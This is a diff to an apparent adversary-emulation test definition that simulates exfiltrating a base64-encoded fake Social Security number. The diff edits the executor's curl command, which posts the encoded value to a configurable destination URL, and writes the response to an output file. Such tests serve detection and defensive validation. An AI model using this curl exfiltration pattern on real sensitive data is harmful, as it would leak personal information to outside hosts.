@@ -20,9 +20,11 @@ atomic_tests:
       description: Encoded data to post using fake Social Security number 111-11-1111.
       type: string
       default: MTExLTExLTExMTE=
+  output:
+    file: ~/output/post.bat
 
   executor:
     name: sh
     command: |
       echo -n 111-11-1111 | base64
-      curl -XPOST #{base64_data}.#{destination_url}
+      curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat
